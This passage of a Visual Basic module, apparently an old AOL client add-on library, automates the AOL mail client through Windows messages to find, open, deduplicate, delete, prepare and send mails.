ModalIcon& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Loop Until (AoModal& <> 0& And ModalIcon& <> 0&) Or FindSendWindow& = 0&
If AoModal& <> 0& Then
Call PostMessage(ModalIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(ModalIcon&, WM_LBUTTONUP, 0&, 0&)
Call WinClose(FindForwardWindow&)
Exit Sub
ElseIf AoModal& = 0& Then
Call WinClose(FindForwardWindow&)
Exit Sub
End If
End Sub
Public Sub MailKillDuplicatesNew()
    Dim TabControl As Long, TabPage As Long, AoTree As Long
    Dim Count1 As Long, Count2 As Long
    TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
   If TabPage& = 0& Then Exit Sub
    AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
   On Error Resume Next
   For Count1& = 0& To ListCount(AoTree&) - 1
      For Count2& = 0& To ListCount(AoTree&) - 1
         If LCase(MailSenderNew(Count1&)) Like LCase(MailSenderNew(Count2&)) And LCase(MailSubjectNew(Count1&)) Like LCase(MailSubjectNew(Count2&)) And Count1& <> Count2& Then
            Call MailDeleteNewIndex(Count2&)
            Count2& = Count2& - 1
         End If
      Next Count2&
   Next Count1&
End Sub

Public Sub MailKillDuplicatesOld()
    Dim TabControl As Long, TabPage1 As Long, aoltree As Long
    Dim FirstCount As Long, SecondCount As Long, TabPage2 As Long
    TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
   If TabPage2& = 0& Then Exit Sub
    aoltree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
   On Error Resume Next
   For FirstCount& = 0& To ListCount(aoltree&) - 1
      For SecondCount& = 0& To ListCount(aoltree&) - 1
         If LCase(MailSenderOld(FirstCount&)) Like LCase(MailSenderOld(SecondCount&)) And LCase(MailSubjectOld(FirstCount&)) Like LCase(MailSubjectOld(SecondCount&)) And FirstCount& <> SecondCount& Then
            Call MailDeleteOldIndex(SecondCount&)
            SecondCount& = SecondCount& - 1
         End If
      Next SecondCount&
   Next FirstCount&
End Sub

Public Sub MailKillDuplicatesSent()
    Dim TabControl As Long, TabPage1 As Long, aoltree As Long
    Dim FirstCount As Long, SecondCount As Long, TabPage2 As Long
    Dim TabPage3 As Long
    TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
    TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
   If TabPage3& = 0& Then Exit Sub
    aoltree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
   On Error Resume Next
   For FirstCount& = 0& To ListCount(aoltree&) - 1
      For SecondCount& = 0& To ListCount(aoltree&) - 1
         If LCase(MailSenderSent(FirstCount&)) Like LCase(MailSenderSent(SecondCount&)) And LCase(MailSubjectSent(FirstCount&)) Like LCase(MailSubjectSent(SecondCount&)) And FirstCount& <> SecondCount& Then
            Call MailDeleteSentIndex(SecondCount&)
            SecondCount& = SecondCount& - 1
         End If
      Next SecondCount&
   Next FirstCount&
End Sub

Public Sub MailKillDuplicatesFlash()
        Dim AoTree As Long, Count1 As Long, Count2 As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
On Error Resume Next
For Count1& = 0& To ListCount(AoTree&) - 1
For Count2& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderFlash(Count1&)) Like LCase(MailSenderFlash(Count2&)) And LCase(MailSubjectFlash(Count1&)) Like LCase(MailSubjectFlash(Count2&)) And Count1& <> Count2& Then
Call MailDeleteFlashIndex(Count2&)
Count2& = Count2& - 1
End If
Next Count2&
Next Count1&
End Sub

Public Sub MailKillDuplicatesNewSender()
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim Count1 As Long, Count2 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
On Error Resume Next
For Count1& = 0& To ListCount(AoTree&) - 1
For Count2& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderNew(Count1&)) Like LCase(MailSenderNew(Count2&)) And Count1& <> Count2& Then
Call MailDeleteNewIndex(Count2&)
Count2& = Count2& - 1
End If
Next Count2&
Next Count1&
End Sub

Public Sub MailKillDuplicatesOldSender()
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim Count1 As Long, Count2 As Long, TabPage2 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
On Error Resume Next
For Count1& = 0& To ListCount(AoTree&) - 1
For Count2& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderOld(Count1&)) Like LCase(MailSenderOld(Count2&)) And Count1& <> Count2& Then
Call MailDeleteOldIndex(Count2&)
Count2& = Count2& - 1
End If
Next Count2&
Next Count1&
End Sub

Public Sub MailKillDuplicatesSentSender()
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim Count1 As Long, Count2 As Long, TabPage2 As Long
        Dim TabPage3 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
On Error Resume Next
For Count1& = 0& To ListCount(AoTree&) - 1
For Count2& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderSent(Count1&)) Like LCase(MailSenderSent(Count2&)) And Count1& <> Count2& Then
Call MailDeleteSentIndex(Count2&)
Count2& = Count2& - 1
End If
Next Count2&
Next Count1&
End Sub

Public Sub MailKillDuplicatesFlashSender()
        Dim AoTree As Long, Count1 As Long, Count2 As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
On Error Resume Next
For Count1& = 0& To ListCount(AoTree&) - 1
For Count2& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderFlash(Count1&)) Like LCase(MailSenderFlash(Count2&)) And Count1& <> Count2& Then
Call MailDeleteFlashIndex(Count2&)
Count2& = Count2& - 1
End If
Next Count2&
Next Count1&
End Sub

Public Sub MailKillDuplicatesNewSubject()
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim Count1 As Long, Count2 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
On Error Resume Next
For Count1& = 0& To ListCount(AoTree&) - 1
For Count2& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectNew(Count1&)) Like LCase(MailSubjectNew(Count2&)) And Count1& <> Count2& Then
Call MailDeleteNewIndex(Count2&)
Count2& = Count2& - 1
End If
Next Count2&
Next Count1&
End Sub

Public Sub MailKillDuplicatesOldSubject()
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim Count1 As Long, Count2 As Long, TabPage2 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
On Error Resume Next
For Count1& = 0& To ListCount(AoTree&) - 1
For Count2& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectOld(Count1&)) Like LCase(MailSubjectOld(Count2&)) And Count1& <> Count2& Then
Call MailDeleteOldIndex(Count2&)
Count2& = Count2& - 1
End If
Next Count2&
Next Count1&
End Sub

Public Sub MailKillDuplicatesSentSubject()
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim Count1 As Long, Count2 As Long, TabPage2 As Long
        Dim TabPage3 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
On Error Resume Next
For Count1& = 0& To ListCount(AoTree&) - 1
For Count2& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectSent(Count1&)) Like LCase(MailSubjectSent(Count2&)) And Count1& <> Count2& Then
Call MailDeleteSentIndex(Count2&)
Count2& = Count2& - 1
End If
Next Count2&
Next Count1&
End Sub

Public Sub MailKillDuplicatesFlashSubject()
        Dim AoTree As Long, Count1 As Long, Count2 As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
On Error Resume Next
For Count1& = 0& To ListCount(AoTree&) - 1
For Count2& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectFlash(Count1&)) Like LCase(MailSubjectFlash(Count2&)) And Count1& <> Count2& Then
Call MailDeleteFlashIndex(Count2&)
Count2& = Count2& - 1
End If
Next Count2&
Next Count1&
End Sub
Public Function MailListString(listbox As listbox, SearchString As String) As String
        Dim Search As Long, PrepString As String
For Search& = 0 To listbox.ListCount - 1
If InStr(LCase(listbox.List(Search&)), LCase(SearchString$)) <> 0& Then
PrepString$ = PrepString$ & vbCrLf & listbox.List(Search&)
End If
Next Search&
MailListString$ = PrepString$
End Function
Public Function MailListString2(listbox As Control, Optional NumberIndex As Boolean = True) As String
        Dim CurrentCount As Long, PrepString As String
For CurrentCount& = 0 To listbox.ListCount - 1
If NumberIndex = True Then
PrepString$ = PrepString$ & CurrentCount& + 1 & "." & listbox.List(CurrentCount&) & vbCrLf
End If
Next CurrentCount&
MailListString2$ = PrepString$
End Function
Public Sub MailMassToCheck(SNList As Control)
        Dim ListIndex As Long
On Error Resume Next
For ListIndex& = 0& To SNList.ListCount - 1
SNList.List(ListIndex&) = SNList.List(ListIndex&) & ": " & MailTosCheck(SNList.List(ListIndex&))
DoEvents
Next ListIndex&
End Sub
Public Sub MailOpenFlash(Optional CheckIfGuest As Boolean = True)
If CheckIfGuest = True Then
If Guest = True Then
Exit Sub
Else
Call PopUpIconDbl(2, "d", "I")
End If
ElseIf CheckIfGuest = False Then
Call PopUpIconDbl(2, "d", "I")
End If
End Sub
Public Sub MailOpenFlashIndex(MailIndex As Long)
        Dim AoTree As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
Call PostMessage(AoTree&, WM_KEYDOWN, VK_RETURN, 0&)
Call PostMessage(AoTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub
Public Sub MailOpenFlashSender(MailSender As String)
        Dim AoTree As Long, Search As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
For Search& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderFlash(Search&)) = LCase(MailSender$) Then
Call MailOpenFlashIndex(Search&)
Exit Sub
End If
Next Search&
End Sub
Public Sub MailOpenFlashSubject(MailSubject As String)
        Dim AoTree As Long, SearchList As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectFlash(SearchList&)) = LCase(MailSubject$) Then
Call MailOpenFlashIndex(SearchList&)
Exit Sub
End If
Next SearchList&
End Sub
Public Sub MailOpenNew()
'Yes its littler than in probally every module you have ever used, but guess what? It works >o]
Call PopUpIcon(2, "R")
End Sub
Public Sub MailOpenNewIndex(MailIndex As Long)
        Dim TabControl As Long, TabPage As Long, AoTree As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
Call PostMessage(AoTree&, WM_KEYDOWN, VK_RETURN, 0&)
Call PostMessage(AoTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub
Public Sub MailOpenNewSender(MailSender As String)
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim SearchList As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderNew(SearchList&)) = LCase(MailSender$) Then
Call MailOpenNewIndex(SearchList&)
Exit Sub
End If
Next SearchList&
End Sub
Public Sub MailOpenNewSubject(MailSubject As String)
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim SearchList As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectNew(SearchList&)) = LCase(MailSubject$) Then
Call MailOpenNewIndex(SearchList&)
Exit Sub
End If
Next SearchList&
End Sub
Public Sub MailOpenOld()
Call PopUpIcon(2, "O")
End Sub
Public Sub MailOpenOldIndex(MailIndex As Long)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim TabPage2 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
Call PostMessage(AoTree&, WM_KEYDOWN, VK_RETURN, 0&)
Call PostMessage(AoTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub
Public Sub MailOpenOldSender(MailSender As String)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim SearchList As Long, TabPage2 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderOld(SearchList&)) = LCase(MailSender$) Then
Call MailOpenOldIndex(SearchList&)
Exit Sub
End If
Next SearchList&
End Sub
Public Sub MailOpenOldSubject(MailSubject As String)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim SearchList As Long, TabPage2 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
If TabPage2& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage2&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectOld(SearchList&)) = LCase(MailSubject$) Then
Call MailOpenOldIndex(SearchList&)
Exit Sub
End If
Next SearchList&
End Sub
Public Sub MailOpenSent()
Call PopUpIcon(2, "S")
End Sub
Public Sub MailOpenSentIndex(MailIndex As Long)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim TabPage2 As Long, TabPage3 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
Call SendMessageLong(AoTree&, LB_SETCURSEL, MailIndex&, 0&)
Call PostMessage(AoTree&, WM_KEYDOWN, VK_RETURN, 0&)
Call PostMessage(AoTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub
Public Sub MailOpenSentSender(MailSender As String)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim SearchList As Long, TabPage2 As Long, TabPage3 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSenderSent(SearchList&)) = LCase(MailSender$) Then
Call MailOpenSentIndex(SearchList&)
Exit Sub
End If
Next SearchList&
End Sub
Public Sub MailOpenSentSubject(MailSubject As String)
        Dim TabControl As Long, TabPage1 As Long, AoTree As Long
        Dim SearchList As Long, TabPage2 As Long, TabPage3 As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage1& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
TabPage2& = FindWindowEx(TabControl&, TabPage1&, "_AOL_TabPage", vbNullString)
TabPage3& = FindWindowEx(TabControl&, TabPage2&, "_AOL_TabPage", vbNullString)
If TabPage3& = 0& Then Exit Sub
AoTree& = FindWindowEx(TabPage3&, 0&, "_AOL_Tree", vbNullString)
For SearchList& = 0& To ListCount(AoTree&) - 1
If LCase(MailSubjectSent(SearchList&)) = LCase(MailSubject$) Then
Call MailOpenSentIndex(SearchList&)
Exit Sub
End If
Next SearchList&
End Sub
Public Sub MailPrep(Person As String, Subject As String, message As String, Optional CheckReturnReceipts As Boolean = False)
        Dim AoFrame As Long, AoToolbar As Long, Toolbar As Long
        Dim AoIcon As Long, AoEdit1 As Long
        Dim AoEdit2 As Long, AoEdit3 As Long, RichText As Long
        Dim CheckBox As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoToolbar& = FindWindowEx(AoFrame&, 0&, "AOL Toolbar", vbNullString)
Toolbar& = FindWindowEx(AoToolbar, 0&, "_AOL_Toolbar", vbNullString)
AoIcon& = NextOfClassByCount(Toolbar&, "_AOL_Icon", 2)
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
AoEdit1& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(FindSendWindow&, AoEdit1&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(FindSendWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
RichText& = FindWindowEx(FindSendWindow&, 0&, "RICHCNTL", vbNullString)
Loop Until FindSendWindow& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0& And AoEdit3& <> 0& And RichText& <> 0&
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, Person$)
Call SendMessageByString(AoEdit3&, WM_SETTEXT, 0&, Subject$)
Call SendMessageByString(RichText&, WM_SETTEXT, 0&, message$)
If CheckReturnReceipts = True Then
CheckBox& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Checkbox", vbNullString)
Call PostMessage(CheckBox&, BM_SETCHECK, True, 0&)
End If
End Sub
Public Sub MailPrepare(Name As String, Optional Subject As String = "", Optional message As String = "", Optional Receipt As Boolean = False, Optional BCC As Boolean = False)
        Dim AoFrame As Long, AoMdiClient As Long, AoIcon As Long
        Dim AoToolbar As Long, Mail As Long, AoEdit1 As Long
        Dim AoEdit2 As Long, AoEdit3 As Long, Richcnt As Long, AoCheckbox As Long
    
AoFrame = FindWindow("AOL Frame25", vbNullString)
AoMdiClient = FindWindowEx(AoFrame, 0, "MDIClient", vbNullString)
Mail = FindWindowEx(AoMdiClient, 0, "AOL Child", "Write Mail")
AoToolbar = FindWindowEx(AoFrame, 0, "AOL Toolbar", vbNullString)
AoToolbar = FindWindowEx(AoToolbar, 0, "_AOL_Toolbar", vbNullString)
If Mail = 0 Then
AoIcon = FindWindowEx(AoToolbar, 0, "_AOL_Icon", vbNullString)
AoIcon = FindWindowEx(AoToolbar, AoIcon, "_AOL_Icon", vbNullString)
Call PostMessage(AoIcon, &H201, 0, 0)
Call PostMessage(AoIcon, &H202, 0, 0)
End If
Do
DoEvents
Mail = FindWindowEx(AoMdiClient, 0, "AOL Child", "Write Mail")
AoEdit1 = FindWindowEx(Mail, 0, "_AOL_Edit", vbNullString)
AoEdit2 = FindWindowEx(Mail, AoEdit1, "_AOL_Edit", vbNullString)
AoEdit3 = FindWindowEx(Mail, AoEdit2, "_AOL_Edit", vbNullString)
Richcnt = FindWindowEx(Mail, 0, "RICHCNTL", vbNullString)
AoCheckbox = FindWindowEx(Mail, 0, "_AOL_Checkbox", vbNullString)
Loop Until Mail <> 0 And AoEdit1 <> 0 And AoEdit2 <> 0 And AoEdit3 <> 0 And Richcnt <> 0 And AoCheckbox <> 0
Call SendMessageByString(AoEdit1, &HC, 0, "")
Call SendMessageByString(AoEdit1, &HC, 0, Name)
If BCC = True Then
Call SendMessageByString(AoEdit2, &HC, 0, "")
Call SendMessageByString(AoEdit2, &HC, 0, Name)
End If
Call SendMessageByString(AoEdit3, &HC, 0, "")
Call SendMessageByString(AoEdit3, &HC, 0, Subject)
Call SendMessageByString(Richcnt, &HC, 0, "")
Call SendMessageByString(Richcnt, &HC, 0, message)
If Receipt = True Then
Call PostMessage(AoCheckbox, &H201, 0, 0)
Call PostMessage(AoCheckbox, &H202, 0, 0)
End If
End Sub

Public Sub MailRemoveErrorNamesFromList(listbox As Control)
        Dim AoView As Long, ErrorTxt As String, ListIndex As Long, ListError
If FindErrorWindow& = 0& Then Exit Sub
AoView& = FindWindowEx(FindErrorWindow&, 0&, "_AOL_View", vbNullString)
ErrorTxt$ = GetText(AoView&)
On Error GoTo ListError
For ListIndex& = 0 To listbox.ListCount - 1
If InStr(ErrorTxt$, listbox.List(ListIndex&)) <> 0& Then
listbox.RemoveItem (ListIndex&)
ListIndex& = ListIndex& + 1
End If
Next ListIndex&
ListError:
End Sub
Public Sub MailRemoveFwd()
        Dim AoEdit As Long, AoEdit2 As Long, AoEdit3 As Long
If InStr(GetCaption(FindFwdWindow&), "Fwd:") = 0& Then Exit Sub
AoEdit& = FindWindowEx(FindFwdWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(FindFwdWindow&, AoEdit&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(FindFwdWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
Call SendMessageByString(AoEdit3&, WM_SETTEXT, 0&, Mid(GetCaption(FindSendWindow&), 6))
End Sub
Public Sub MailRemoveRe()
        Dim AoEdit As Long, AoEdit2 As Long, AoEdit3 As Long
If InStr(GetCaption(FindReWindow&), "Re:") = 0& Then Exit Sub
AoEdit& = FindWindowEx(FindReWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(FindReWindow&, AoEdit&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(FindReWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
Call SendMessageByString(AoEdit3&, WM_SETTEXT, 0&, Mid(GetCaption(FindSendWindow&), 5))
End Sub
Public Sub MailSend(Person As String, Subject As String, message As String, Optional CheckReturnReceipts As Boolean = False)
        Dim AoFrame As Long, AoToolbar As Long, Toolbar As Long
        Dim AoIcon1 As Long, AoEdit1 As Long, AoMDI As Long
        Dim AoEdit2 As Long, AoEdit3 As Long, RichText As Long
        Dim AoIcon2 As Long, AoModal As Long, AoIcon3 As Long
        Dim CheckBox As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoToolbar& = FindWindowEx(AoFrame&, 0&, "AOL Toolbar", vbNullString)
Toolbar& = FindWindowEx(AoToolbar, 0&, "_AOL_Toolbar", vbNullString)
AoIcon1& = NextOfClassByCount(Toolbar&, "_AOL_Icon", 2)
Call PostMessage(AoIcon1&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon1&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
AoEdit1& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(FindSendWindow&, AoEdit1&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(FindSendWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
RichText& = FindWindowEx(FindSendWindow&, 0&, "RICHCNTL", vbNullString)
AoIcon2& = NextOfClassByCount(FindSendWindow&, "_AOL_Icon", 14)
Loop Until FindSendWindow& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0& And AoEdit3& <> 0& And RichText& <> 0& And AoIcon2& <> 0&
Call WinMinimize(FindSendWindow&)
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, Person$)
Call SendMessageByString(AoEdit3&, WM_SETTEXT, 0&, Subject$)
Call SendMessageByString(RichText&, WM_SETTEXT, 0&, message$)
If CheckReturnReceipts = True Then
CheckBox& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Checkbox", vbNullString)
Call PostMessage(CheckBox&, BM_SETCHECK, True, 0&)
End If
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", vbNullString)
AoIcon3& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Loop Until AoModal& <> 0& And AoIcon3& <> 0&
If AoModal& <> 0& And FindWindowEx(AoMDI&, 0&, "AOL Child", "Write Mail") = 0& Then
Call PostMessage(AoIcon3&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon3&, WM_LBUTTONUP, 0&, 0&)
Exit Sub
ElseIf FindWindowEx(AoMDI&, 0&, "AOL Child", "Write Mail") = 0& And AoModal& = 0& Then
Exit Sub
End If
End Sub
Public Function MailSenderFlash(MailIndex As Long) As String
        Dim LenSender As Long, FixedString As String, AoTree As Long
        Dim Instance1 As Long, Instance2 As Long, TreeCount As Long
AoTree& = FindWindowEx(FindFlashMailBox&, 0&, "_AOL_Tree", vbNullString)
TreeCount& = ListCount(AoTree&)
If TreeCount& = 0& Or MailIndex& > TreeCount& - 1 Or MailIndex& < 0& Then Exit Function
LenSender& = SendMessageLong(AoTree&, LB_GETTEXTLEN, MailIndex&, 0&)
FixedString$ = String(LenSender&, 0&)
Call SendMessageByString(AoTree&, LB_GETTEXT, MailIndex&, FixedString$)
Instance1& = InStr(FixedString$, vbTab)
Instance2& = InStr(Instance1& + 1, FixedString$, vbTab)
MailSenderFlash$ = Mid(FixedString$, Instance1& + 1, Instance2& - Instance1& - 1)
End Function
Public Function MailSenderNew(MailIndex As Long) As String
        Dim LenSender As Long, FixedString As String, PrepSender As String
        Dim TabControl As Long, TabPage As Long, AoTree As Long
        Dim Instance1 As Long, Instance2 As Long, TreeCount As Long
TabControl& = FindWindowEx(FindMailBox&, 0&, "_AOL_TabControl", vbNullString)
TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
If TabPage& = 0& Then Exit Function
AoTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
TreeCount& = ListCount(AoTree&)
